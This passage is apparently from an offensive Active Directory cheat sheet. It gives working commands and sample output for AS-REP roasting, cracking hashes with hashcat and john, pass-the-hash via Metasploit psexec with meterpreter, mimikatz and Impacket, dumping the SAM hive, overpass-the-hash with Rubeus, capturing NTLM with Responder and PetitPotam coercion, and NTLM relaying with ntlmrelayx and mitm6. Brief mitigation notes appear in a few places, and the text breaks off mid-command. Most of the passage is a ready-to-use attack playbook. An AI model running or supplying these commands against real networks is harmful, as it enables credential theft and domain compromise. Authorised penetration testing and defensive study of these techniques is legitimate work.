<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>C:\Rubeus&gt;Rubeus.exe asreproast /user<span style="color:#960050;background-color:#1e0010">:</span>TestOU3user /format<span style="color:#960050;background-color:#1e0010">:</span>hashcat /outfile<span style="color:#960050;background-color:#1e0010">:</span>hashes.asreproast
</span></span><span style="display:flex;"><span>[*] Action<span style="color:#960050;background-color:#1e0010">:</span> AS-REP roasting
</span></span><span style="display:flex;"><span>[*] Target User            <span style="color:#960050;background-color:#1e0010">:</span> TestOU3user
</span></span><span style="display:flex;"><span>[*] Target Domain          <span style="color:#960050;background-color:#1e0010">:</span> testlab.local
</span></span><span style="display:flex;"><span>[*] SamAccountName         <span style="color:#960050;background-color:#1e0010">:</span> TestOU3user
</span></span><span style="display:flex;"><span>[*] DistinguishedName      <span style="color:#960050;background-color:#1e0010">:</span> CN=TestOU3user,OU=TestOU3,OU=TestOU2,OU=TestOU1,DC=testlab,DC=local
</span></span><span style="display:flex;"><span>[*] Using domain controller<span style="color:#960050;background-color:#1e0010">:</span> testlab.local (<span style="color:#ae81ff">192.168</span>.52.<span style="color:#ae81ff">100</span>)
</span></span><span style="display:flex;"><span>[*] Building AS-REQ (w/o preauth) <span style="color:#66d9ef">for</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#e6db74">&#39;testlab.local\TestOU3user&#39;</span>
</span></span><span style="display:flex;"><span>[*] Connecting to <span style="color:#ae81ff">192.168</span>.52.<span style="color:#ae81ff">100</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">88</span>
</span></span><span style="display:flex;"><span>[*] Sent <span style="color:#ae81ff">169</span> bytes
</span></span><span style="display:flex;"><span>[*] Received <span style="color:#ae81ff">1437</span> bytes
</span></span><span style="display:flex;"><span>[+] AS-REQ w/o preauth successful!
</span></span><span style="display:flex;"><span>[*] AS-REP hash<span style="color:#960050;background-color:#1e0010">:</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$krb5asrep$TestOU3user@testlab.local<span style="color:#960050;background-color:#1e0010">:</span>858B6F645D9F9B57210292E5711E0...(snip)...
</span></span></code></pre></div></li>
<li>
<p><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py">GetNPUsers</a> from Impacket Suite</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$ python GetNPUsers.py htb.local/svc-alfresco -no-pass
</span></span><span style="display:flex;"><span>[*] Getting TGT <span style="color:#66d9ef">for</span> svc-alfresco
</span></span><span style="display:flex;"><span>$krb5asrep$23$svc-alfresco@HTB.LOCAL<span style="color:#960050;background-color:#1e0010">:</span>c13528009a59be0a634bb9b8e84c88ee$cb8e87d02bd0ac7a[...]e776b4
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># extract hashes</span>
</span></span><span style="display:flex;"><span>root@kali<span style="color:#960050;background-color:#1e0010">:</span>impacket-examples$ python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
</span></span><span style="display:flex;"><span>root@kali<span style="color:#960050;background-color:#1e0010">:</span>impacket-examples$ python GetNPUsers.py jurassic.park/triceratops<span style="color:#960050;background-color:#1e0010">:</span>Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
</span></span></code></pre></div></li>
<li>
<p>CrackMapExec Module</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$ crackmapexec ldap <span style="color:#ae81ff">10.0</span>.2.11 -u <span style="color:#e6db74">&#39;username&#39;</span> -p <span style="color:#e6db74">&#39;password&#39;</span> --kdcHost <span style="color:#ae81ff">10.0</span>.2.11 --asreproast output.txt
</span></span><span style="display:flex;"><span>LDAP        <span style="color:#ae81ff">10.0</span>.2.11       <span style="color:#ae81ff">389</span>    dc01           $krb5asrep$23$john.doe@LAB.LOCAL<span style="color:#960050;background-color:#1e0010">:</span>5d1f750[...]2a6270d7$096fc87726c64e545acd4687faf780[...]13ea567d5
</span></span></code></pre></div></li>
</ul>
<p>Using <code>hashcat</code> or <code>john</code> to crack the ticket.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># crack AS_REP messages with hashcat</span>
</span></span><span style="display:flex;"><span>root@kali<span style="color:#960050;background-color:#1e0010">:</span>impacket-examples$ hashcat -m <span style="color:#ae81ff">18200</span> --force -a <span style="color:#ae81ff">0</span> hashes.asreproast passwords_kerb.txt 
</span></span><span style="display:flex;"><span>root@windows<span style="color:#960050;background-color:#1e0010">:</span>hashcat$ hashcat64.exe -m <span style="color:#ae81ff">18200</span> <span style="color:#e6db74">&#39;&lt;AS_REP-hash&gt;&#39;</span> -a <span style="color:#ae81ff">0</span> c:\wordlists\rockyou.txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># crack AS_REP messages with john</span>
</span></span><span style="display:flex;"><span>C:\Rubeus&gt; john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
</span></span></code></pre></div><p><strong>Mitigations</strong>:</p>
<ul>
<li>All accounts must have &ldquo;Kerberos Pre-Authentication&rdquo; enabled (Enabled by Default).</li>
</ul>
<h3 id="pass-the-hash">
  Pass-the-Hash
  <a class="anchor" href="#pass-the-hash">#</a>
</h3>
<p>The types of hashes you can use with Pass-The-Hash are NT or NTLM hashes. Since Windows Vista, attackers have been unable to pass-the-hash to local admin accounts that weren’t the built-in RID 500.</p>
<ul>
<li>Metasploit
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>use exploit/windows/smb/psexec
</span></span><span style="display:flex;"><span>set RHOST <span style="color:#ae81ff">10.2</span>.0.3
</span></span><span style="display:flex;"><span>set SMBUser jarrieta
</span></span><span style="display:flex;"><span>set SMBPass nastyCutt3r  
</span></span><span style="display:flex;"><span><span style="color:#75715e"># NOTE1: The password can be replaced by a hash to execute a `pass the hash` attack.</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># NOTE2: Require the full NTLM hash, you may need to add the &#34;blank&#34; LM (aad3b435b51404eeaad3b435b51404ee)</span>
</span></span><span style="display:flex;"><span>set PAYLOAD windows/meterpreter/bind_tcp
</span></span><span style="display:flex;"><span>run
</span></span><span style="display:flex;"><span>shell
</span></span></code></pre></div></li>
<li>CrackMapExec
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>cme smb <span style="color:#ae81ff">10.2</span>.0.<span style="color:#ae81ff">2</span>/<span style="color:#ae81ff">24</span> -u jarrieta -H <span style="color:#e6db74">&#39;aad3b435b51404eeaad3b435b51404ee:489a04c09a5debbc9b975356693e179d&#39;</span> -x <span style="color:#e6db74">&#34;whoami&#34;</span>
</span></span></code></pre></div></li>
<li>Impacket suite
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>proxychains python ./psexec.py jarrieta@10.2.0.2 -hashes <span style="color:#960050;background-color:#1e0010">:</span>489a04c09a5debbc9b975356693e179d
</span></span></code></pre></div></li>
<li>Windows RDP and mimikatz
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>sekurlsa::pth /user<span style="color:#960050;background-color:#1e0010">:</span>Administrator /domain<span style="color:#960050;background-color:#1e0010">:</span>contoso.local /ntlm<span style="color:#960050;background-color:#1e0010">:</span>b73fdfe10e87b4ca5c0d957f81de6863
</span></span><span style="display:flex;"><span>sekurlsa::pth /user<span style="color:#960050;background-color:#1e0010">:</span>&lt;user name&gt; /domain<span style="color:#960050;background-color:#1e0010">:</span>&lt;domain name&gt; /ntlm<span style="color:#960050;background-color:#1e0010">:</span>&lt;the users ntlm hash&gt; /run<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#34;mstsc.exe /restrictedadmin&#34;</span>
</span></span></code></pre></div></li>
</ul>
<p>You can extract the local <strong>SAM database</strong> to find the local administrator hash :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>C:\&gt; reg.exe save hklm\sam c:\temp\sam.save
</span></span><span style="display:flex;"><span>C:\&gt; reg.exe save hklm\security c:\temp\security.save
</span></span><span style="display:flex;"><span>C:\&gt; reg.exe save hklm\system c:\temp\system.save
</span></span><span style="display:flex;"><span>$ secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
</span></span></code></pre></div><h3 id="overpass-the-hash-pass-the-key">
  OverPass-the-Hash (pass the key)
  <a class="anchor" href="#overpass-the-hash-pass-the-key">#</a>
</h3>
<p>In this technique, instead of passing the hash directly, we use the NTLM hash of an account to request a valid Kerberost ticket (TGT).</p>
<h4 id="using-impacket">
  Using impacket
  <a class="anchor" href="#using-impacket">#</a>
</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@kali:~$ python ./getTGT.py -hashes <span style="color:#e6db74">&#34;:1a59bd44fe5bec39c44c8cd3524dee&#34;</span> lab.ropnop.com
</span></span><span style="display:flex;"><span>root@kali:~$ export KRB5CCNAME<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/root/impacket-examples/velociraptor.ccache&#34;</span>
</span></span><span style="display:flex;"><span>root@kali:~$ python3 psexec.py <span style="color:#e6db74">&#34;jurassic.park/velociraptor@labwws02.jurassic.park&#34;</span> -k -no-pass
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># also with the AES Key if you have it</span>
</span></span><span style="display:flex;"><span>root@kali:~$ ./getTGT.py -aesKey xxxxxxxxxxxxxxkeyaesxxxxxxxxxxxxxxxx lab.ropnop.com
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>root@kali:~$ ktutil -k ~/mykeys add -p tgwynn@LAB.ROPNOP.COM -e arcfour-hma-md5 -w 1a59bd44fe5bec39c44c8cd3524dee --hex -V <span style="color:#ae81ff">5</span>
</span></span><span style="display:flex;"><span>root@kali:~$ kinit -t ~/mykers tgwynn@LAB.ROPNOP.COM
</span></span><span style="display:flex;"><span>root@kali:~$ klist
</span></span></code></pre></div><h4 id="using-rubeus">
  Using Rubeus
  <a class="anchor" href="#using-rubeus">#</a>
</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Request a TGT as the target user and pass it into the current session</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># NOTE: Make sure to clear tickets in the current session (with &#39;klist purge&#39;) to ensure you don&#39;t have multiple active TGTs</span>
</span></span><span style="display:flex;"><span>.\Rubeus.exe asktgt /user<span style="color:#960050;background-color:#1e0010">:</span>Administrator /rc4<span style="color:#960050;background-color:#1e0010">:</span>[<span style="color:#66d9ef">NTLMHASH</span>] /ptt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># More stealthy variant, but requires the AES256 hash</span>
</span></span><span style="display:flex;"><span>.\Rubeus.exe asktgt /user<span style="color:#960050;background-color:#1e0010">:</span>Administrator /aes256<span style="color:#960050;background-color:#1e0010">:</span>[<span style="color:#66d9ef">AES256HASH</span>] /opsec /ptt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Pass the ticket to a sacrificial hidden process, allowing you to e.g. steal the token from this process (requires elevation)</span>
</span></span><span style="display:flex;"><span>.\Rubeus.exe asktgt /user<span style="color:#960050;background-color:#1e0010">:</span>Administrator /rc4<span style="color:#960050;background-color:#1e0010">:</span>[<span style="color:#66d9ef">NTLMHASH</span>] /createnetonly<span style="color:#960050;background-color:#1e0010">:</span>C:\Windows\System32\cmd.exe
</span></span></code></pre></div><h3 id="capturing-and-cracking-net-ntlmv1ntlmv1-hashes">
  Capturing and cracking Net-NTLMv1/NTLMv1 hashes
  <a class="anchor" href="#capturing-and-cracking-net-ntlmv1ntlmv1-hashes">#</a>
</h3>
<blockquote>
<p>Net-NTLM (NTLMv1) hashes are used for network authentication (they are derived from a challenge/response algorithm and are based on the user&rsquo;s NT hash.</p>
</blockquote>
<p>:information_source: : Coerce a callback using PetitPotam or SpoolSample on an affected machine and downgrade the authentication to <strong>NetNTLMv1 Challenge/Response authentication</strong>. This uses the outdated encryption method DES to protect the NT/LM Hashes.</p>
<p><strong>Requirements</strong>:</p>
<ul>
<li>LmCompatibilityLevel = 0x1: Send LM &amp; NTLM (<code>reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v lmcompatibilitylevel</code>)</li>
</ul>
<p><strong>Exploitation</strong>:</p>
<ul>
<li>Capturing using Responder: Edit the <code>/etc/responder/Responder.conf</code> file to include the magical <strong>1122334455667788</strong> challenge
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>HTTPS = On
</span></span><span style="display:flex;"><span>DNS = On
</span></span><span style="display:flex;"><span>LDAP = On
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>; Custom challenge.
</span></span><span style="display:flex;"><span>; Use <span style="color:#e6db74">&#34;Random&#34;</span> <span style="color:#66d9ef">for</span> generating a random challenge <span style="color:#66d9ef">for</span> each requests (<span style="color:#66d9ef">Default</span>)
</span></span><span style="display:flex;"><span>Challenge = <span style="color:#ae81ff">1122334455667788</span>
</span></span></code></pre></div></li>
<li>Fire Responder: <code>responder -I eth0 --lm</code>, if <code>--disable-ess</code> is set, extended session security will be disabled for NTLMv1 authentication</li>
<li>Force a callback:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>PetitPotam.exe Responder-IP DC-IP <span style="color:#75715e"># Patched around August 2021</span>
</span></span><span style="display:flex;"><span>PetitPotam.py -u Username -p Password -d Domain -dc-ip DC-IP Responder-IP DC-IP <span style="color:#75715e"># Not patched for authenticated users</span>
</span></span></code></pre></div></li>
<li>If you got some <code>NTLMv1 hashes</code>, you need to format them to submit them on <a href="https://crack.sh/netntlm/">crack.sh</a>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>username::hostname<span style="color:#960050;background-color:#1e0010">:</span>response<span style="color:#960050;background-color:#1e0010">:</span>response<span style="color:#960050;background-color:#1e0010">:</span>challenge -&gt; NTHASH<span style="color:#960050;background-color:#1e0010">:</span>response
</span></span><span style="display:flex;"><span>NTHASH<span style="color:#960050;background-color:#1e0010">:</span>F35A3FE17DCB31F9BE8A8004B3F310C150AFA36195554972
</span></span></code></pre></div></li>
<li>Or crack them with Hashcat / John The Ripper
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>john --format=netntlm hash.txt
</span></span><span style="display:flex;"><span>hashcat -m <span style="color:#ae81ff">5500</span> -a <span style="color:#ae81ff">3</span> hash.txt
</span></span></code></pre></div></li>
<li>Now you can DCSync using the Pass-The-Hash with the DC machine account</li>
</ul>
<p>:warning: NTLMv1 with SSP(Security Support Provider) changes the server challenge and is not quite ideal for the attack, but it can be used.</p>
<p><strong>Mitigations</strong>:</p>
<ul>
<li>Set the Lan Manager authentication level to <code>Send NTLMv2 responses only. Refuse LM &amp; NTLM</code></li>
</ul>
<h3 id="capturing-and-cracking-net-ntlmv2ntlmv2-hashes">
  Capturing and cracking Net-NTLMv2/NTLMv2 hashes
  <a class="anchor" href="#capturing-and-cracking-net-ntlmv2ntlmv2-hashes">#</a>
</h3>
<p>If any user in the network tries to access a machine and mistype the IP or the name, Responder will answer for it and ask for the NTLMv2 hash to access the resource. Responder will poison <code>LLMNR</code>, <code>MDNS</code> and <code>NETBIOS</code> requests on the network.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># https://github.com/lgandx/Responder</span>
</span></span><span style="display:flex;"><span>$ sudo ./Responder.py -I eth0 -wfrd -P -v
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># https://github.com/Kevin-Robertson/InveighZero</span>
</span></span><span style="display:flex;"><span>PS &gt; .\inveighzero.exe -FileOutput Y -NBNS Y -mDNS Y -Proxy Y -MachineAccounts Y -DHCPv6 Y -LLMNRv6 Y [-Elevated N]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># https://github.com/EmpireProject/Empire/blob/master/data/module_source/collection/Invoke-Inveigh.ps1</span>
</span></span><span style="display:flex;"><span>PS &gt; Invoke-Inveigh [-IP <span style="color:#e6db74">&#39;10.10.10.10&#39;</span>] -ConsoleOutput Y -FileOutput Y -NBNS Y <span style="color:#960050;background-color:#1e0010">–</span>mDNS Y <span style="color:#960050;background-color:#1e0010">–</span>Proxy Y -MachineAccounts Y
</span></span></code></pre></div><p>Crack the hashes with Hashcat / John The Ripper</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>john --format=netntlmv2 hash.txt
</span></span><span style="display:flex;"><span>hashcat -m <span style="color:#ae81ff">5600</span> -a <span style="color:#ae81ff">3</span> hash.txt
</span></span></code></pre></div><h3 id="man-in-the-middle-attacks--relaying">
  Man-in-the-Middle attacks &amp; relaying
  <a class="anchor" href="#man-in-the-middle-attacks--relaying">#</a>
</h3>
<p>NTLMv1 and NTLMv2 can be relayed to connect to another machine.</p>
<table>
<thead>
<tr>
<th>Hash</th>
<th>Hashcat</th>
<th>Attack method</th>
</tr>
</thead>
<tbody>
<tr>
<td>LM</td>
<td><code>3000</code></td>
<td>crack/pass the hash</td>
</tr>
<tr>
<td>NTLM/NTHash</td>
<td><code>1000</code></td>
<td>crack/pass the hash</td>
</tr>
<tr>
<td>NTLMv1/Net-NTLMv1</td>
<td><code>5500</code></td>
<td>crack/relay attack</td>
</tr>
<tr>
<td>NTLMv2/Net-NTLMv2</td>
<td><code>5600</code></td>
<td>crack/relay attack</td>
</tr>
</tbody>
</table>
<p>Crack the hash with <code>hashcat</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>hashcat -m <span style="color:#ae81ff">5600</span> -a <span style="color:#ae81ff">0</span> hash.txt crackstation.txt
</span></span></code></pre></div><h4 id="ms08-068-ntlm-reflection">
  MS08-068 NTLM reflection
  <a class="anchor" href="#ms08-068-ntlm-reflection">#</a>
</h4>
<p>NTLM reflection vulnerability in the SMB protocolOnly targeting Windows 2000 to Windows Server 2008.</p>
<blockquote>
<p>This vulnerability allows an attacker to redirect an incoming SMB connection back to the machine it came from and then access the victim machine using the victim’s own credentials.</p>
</blockquote>
<ul>
<li><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS08-068">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS08-068</a></li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>msf &gt; use exploit/windows/smb/smb_relay
</span></span><span style="display:flex;"><span>msf exploit(smb_relay) &gt; show targets
</span></span></code></pre></div><h4 id="smb-signing-disabled-and-ipv4">
  SMB Signing Disabled and IPv4
  <a class="anchor" href="#smb-signing-disabled-and-ipv4">#</a>
</h4>
<p>If a machine has <code>SMB signing</code>:<code>disabled</code>, it is possible to use Responder with Multirelay.py script to perform an <code>NTLMv2 hashes relay</code> and get a shell access on the machine. Also called <strong>LLMNR/NBNS Poisoning</strong></p>
<ol>
<li>Open the Responder.conf file and set the value of <code>SMB</code> and <code>HTTP</code> to <code>Off</code>.
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>[<span style="color:#66d9ef">Responder Core</span>]
</span></span><span style="display:flex;"><span>; Servers to start
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>SMB = Off     <span style="color:#75715e"># Turn this off</span>
</span></span><span style="display:flex;"><span>HTTP = Off    <span style="color:#75715e"># Turn this off</span>
</span></span></code></pre></div></li>
<li>Run <code>python  RunFinger.py -i IP_Range</code> to detect machine with <code>SMB signing</code>:<code>disabled</code>.</li>
<li>Run <code>python Responder.py -I &lt;interface_card&gt;</code></li>
<li>Use a relay tool such as <code>ntlmrelayx</code> or <code>MultiRelay</code>
<ul>
<li><code>impacket-ntlmrelayx -tf targets.txt</code> to dump the SAM database of the targets in the list.</li>
<li><code>python MultiRelay.py -t &lt;target_machine_IP&gt; -u ALL</code></li>
</ul>
</li>
<li>ntlmrelayx can also act as a SOCK proxy with every compromised sessions.
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$ impacket-ntlmrelayx -tf /tmp/targets.txt -socks -smb2support
</span></span><span style="display:flex;"><span>[*] Servers started, waiting <span style="color:#66d9ef">for</span> connections
</span></span><span style="display:flex;"><span>Type help <span style="color:#66d9ef">for</span> list of commands
</span></span><span style="display:flex;"><span>ntlmrelayx&gt; socks
</span></span><span style="display:flex;"><span>Protocol  Target          Username                  Port
</span></span><span style="display:flex;"><span>--------  --------------  ------------------------  ----
</span></span><span style="display:flex;"><span>MSSQL     <span style="color:#ae81ff">192.168</span>.48.230  VULNERABLE/ADMINISTRATOR  <span style="color:#ae81ff">1433</span>
</span></span><span style="display:flex;"><span>SMB       <span style="color:#ae81ff">192.168</span>.48.230  CONTOSO/NORMALUSER1       <span style="color:#ae81ff">445</span>
</span></span><span style="display:flex;"><span>MSSQL     <span style="color:#ae81ff">192.168</span>.48.230  CONTOSO/NORMALUSER1       <span style="color:#ae81ff">1433</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># You might need to select a target with &#34;-t&#34;</span>
</span></span><span style="display:flex;"><span>impacket-ntlmrelayx -t mssql<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">10.10</span>.10.10 -socks -smb2support
</span></span><span style="display:flex;"><span>impacket-ntlmrelayx -t smb<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">10.10</span>.10.10 -socks -smb2support
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># the socks proxy can then be used with your Impacket tools or CrackMapExec</span>
</span></span><span style="display:flex;"><span>$ proxychains impacket-smbclient //<span style="color:#ae81ff">192.168</span>.48.<span style="color:#ae81ff">230</span>/Users -U contoso/normaluser1
</span></span><span style="display:flex;"><span>$ proxychains impacket-mssqlclient DOMAIN/USER@10.10.10.10 -windows-auth
</span></span><span style="display:flex;"><span>$ proxychains crackmapexec mssql <span style="color:#ae81ff">10.10</span>.10.10 -u user -p <span style="color:#e6db74">&#39;&#39;</span> -d DOMAIN -q <span style="color:#e6db74">&#34;SELECT 1&#34;</span>   
</span></span></code></pre></div></li>
</ol>
<p><strong>Mitigations</strong>:</p>
<ul>
<li>Disable LLMNR via group policy
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Open gpedit.msc and navigate to Computer Configuration &gt; Administrative Templates &gt; Network &gt; DNS Client &gt; Turn off multicast name resolution and set to Enabled
</span></span></code></pre></div></li>
<li>Disable NBT-NS
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>This can be achieved by navigating through the GUI to Network card &gt; Properties &gt; IPv4 &gt; Advanced &gt; WINS and then under <span style="color:#e6db74">&#34;NetBIOS setting&#34;</span> select Disable NetBIOS over TCP/IP
</span></span></code></pre></div></li>
</ul>
<h4 id="smb-signing-disabled-and-ipv6">
  SMB Signing Disabled and IPv6
  <a class="anchor" href="#smb-signing-disabled-and-ipv6">#</a>
</h4>
<p>Since <a href="https://docs.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-077">MS16-077</a> the location of the WPAD file is no longer requested via broadcast protocols, but only via DNS.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>crackmapexec smb $hosts --gen-relay-list relay.txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># DNS takeover via IPv6, mitm6 will request an IPv6 address via DHCPv6</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># -d is the domain name that we filter our request on - the attacked domain</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># -i is the interface we have mitm6 listen on for events</span>
</span></span><span style="display:flex;"><span>mitm6 -i eth0 -d $domain
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># spoofing WPAD and relaying NTLM credentials</span>
</span></span><span style="display:flex;"><span>impacket-ntlmrelayx <span style="color:#ae81ff">-6</span> -wh $attacker_ip -of loot -tf relay.txt
</span></span><span style="display:flex;"><span>impacket-ntlmrelayx <span style="color:#ae81ff">-6</span> -wh $attacker_ip -l /tmp -socks -debug
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># -ip is the interface you want the relay to run on</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># -wh is for WPAD host, specifying your wpad file to serve</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># -t is the target where you want to relay to. </span>
</span></span><span style="display:flex;"><span>impacket-ntlmrelayx -ip <span style="color:#ae81ff">10.10</span>.10.1 -wh $attacker_ip -t ldaps<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">10.10</span>.10.2
</span></span></code></pre></div><h4 id="drop-the-mic">
  Drop the MIC
  <a class="anchor" href="#drop-the-mic">#</a>
</h4>
<blockquote>
<p>The CVE-2019-1040 vulnerability makes it possible to modify the NTLM authentication packets without invalidating the authentication, and thus enabling an attacker to remove the flags which would prevent relaying from SMB to LDAP</p>
</blockquote>
<p>Check vulnerability with <a href="https://github.com/fox-it/cve-2019-1040-scanner">cve-2019-1040-scanner</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>python2 scanMIC.py <span style="color:#e6db74">&#39;DOMAIN/USERNAME:PASSWORD@TARGET&#39;</span>
</span></span><span style="display:flex;"><span>[*] CVE-<span style="color:#ae81ff">2019</span>-<span style="color:#ae81ff">1040</span> scanner by @_dirkjan / Fox-IT - Based on impacket by SecureAuth
</span></span><span style="display:flex;"><span>[*] Target TARGET is not vulnerable to CVE-<span style="color:#ae81ff">2019</span>-<span style="color:#ae81ff">1040</span> (authentication was rejected)
</span></span></code></pre></div><ul>
<li>
<p>Using any AD account, connect over SMB to a victim Exchange server, and trigger the SpoolService bug. The attacker server will connect back to you over SMB, which can be relayed with a modified version of ntlmrelayx to LDAP. Using the relayed LDAP authentication, grant DCSync privileges to the attacker account. The attacker account can now use DCSync to dump all password hashes in AD</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>TERM1&gt; python printerbug.py testsegment.local/username@s2012exc.testsegment.local &lt;attacker ip/hostname&gt;
